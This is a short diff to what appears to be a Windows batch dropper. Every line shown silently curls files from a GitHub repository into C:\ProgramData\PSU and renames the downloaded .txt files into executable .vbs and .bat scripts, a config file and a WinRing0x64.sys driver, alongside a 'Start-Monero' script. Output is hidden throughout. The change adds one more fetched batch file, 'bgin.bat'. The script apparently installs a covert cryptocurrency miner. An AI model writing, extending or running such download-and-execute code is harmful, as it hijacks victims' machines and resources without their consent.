@@ -4,6 +4,7 @@ timeout 1 >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Install.txt" -o "C:\ProgramData\PSU\Install.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Start-Monero.txt" -o "C:\ProgramData\PSU\Start-Monero.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/WinRing0x64.txt" -o "C:\ProgramData\PSU\WinRing0x64.sys" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/bgin.txt" -o "C:\ProgramData\PSU\bgin.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/check.txt" -o "C:\ProgramData\PSU\check.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/config.txt" -o "C:\ProgramData\PSU\config.json" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/execute.txt" -o "C:\ProgramData\PSU\execute.vbs" >> nul
